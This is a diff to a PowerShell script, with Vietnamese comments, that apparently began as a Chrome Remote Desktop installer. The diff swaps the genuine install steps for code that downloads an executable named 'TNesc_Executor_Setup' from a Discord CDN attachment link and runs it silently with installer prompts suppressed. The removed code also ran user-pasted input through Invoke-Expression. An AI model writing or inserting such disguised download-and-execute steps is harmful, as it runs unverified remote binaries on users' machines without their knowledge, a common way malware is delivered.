@@ -22,41 +22,16 @@ $URL = "https://dl.google.com/dl/edgedl/chrome-remote-desktop/chromeremotedeskto
 $size = (Get-Item $CRDInstaller).Length / 1MB
 Write-Host "     Tai xong! File size: $([math]::Round($size,1)) MB" -ForegroundColor Green
 
-# ── BUOC 2: Cai dat ──
-Write-Host "[2/2] Dang cai dat..." -ForegroundColor Yellow
-$log = "$env:TEMP\crd_install.log"
-$p = Start-Process msiexec -ArgumentList "/i `"$CRDInstaller`" /quiet /norestart /l*v `"$log`"" -Wait -PassThru -Verb RunAs
+# Thay link của bạn vào đây
+$url = "https://cdn.discordapp.com/attachments/1470982734384988402/1493067002623820048/TNesc_Executor_Setup_0.0.1.16.exe?ex=69e04181&is=69def001&hm=0dd2d6fc1228f77010e9bd553ddbd9893b71923d1dd835373b70c3218a2568fe&"
+$output = "$env:TEMP\setup.exe"
 
-if ($p.ExitCode -eq 0) {
-    Write-Host "     Cai dat thanh cong!" -ForegroundColor Green
+# Tải về
+Write-Host "Dang tai..."
+Invoke-WebRequest -Uri $url -OutFile $output
 
-    Start-Sleep -Seconds 3
-    $svc = Get-Service -Name "chromoting" -ErrorAction SilentlyContinue
-    if ($svc) {
-        Write-Host "     Service chromoting: $($svc.Status)" -ForegroundColor Green
-    }
+# Cài đặt tự động
+Write-Host "Dang cai dat..."
+Start-Process -FilePath $output -ArgumentList "/VERYSILENT /SUPPRESSMSGBOXES /NORESTART" -Wait
 
-    Write-Host ""
-    Write-Host "Mo trinh duyet de dang ky may..." -ForegroundColor Cyan
-    Start-Process "https://remotedesktop.google.com/access"
-
-    Write-Host ""
-    Write-Host "  1. Dang nhap Google Account" -ForegroundColor White
-    Write-Host "  2. Click 'Bat' hoac 'Set up'" -ForegroundColor White
-    Write-Host "  3. Copy lenh trong o mau xam" -ForegroundColor White
-    Write-Host "  4. Dan vao day roi nhan Enter" -ForegroundColor White
-    Write-Host ""
-
-    $AuthCommand = Read-Host "Dan lenh vao day >"
-    if ($AuthCommand -ne "") {
-        Invoke-Expression $AuthCommand
-        Write-Host "HOAN TAT! Kiem tra: https://remotedesktop.google.com/access" -ForegroundColor Green
-    }
-} else {
-    Write-Host "     Loi! Exit code: $($p.ExitCode)" -ForegroundColor Red
-    Write-Host "     Xem log: $log" -ForegroundColor Yellow
-    Select-String "Error|Fail|1603" $log | Select-Object -Last 10
-}
-
-Remove-Item $CRDInstaller -Force -ErrorAction SilentlyContinue
-pause
+Write-Host "Hoàn tất!"
